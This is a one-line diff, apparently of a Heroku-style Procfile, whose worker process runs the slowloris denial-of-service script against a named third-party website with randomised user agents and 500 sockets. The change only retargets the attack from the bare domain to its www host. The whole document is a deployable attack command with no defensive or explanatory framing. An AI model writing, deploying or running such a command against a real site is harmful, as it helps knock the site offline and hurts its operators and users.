@@ -1,1 +1,1 @@
-worker: python slowloris.py autoskillz.net -ua -s 500
+worker: python slowloris.py www.autoskillz.net -ua -s 500
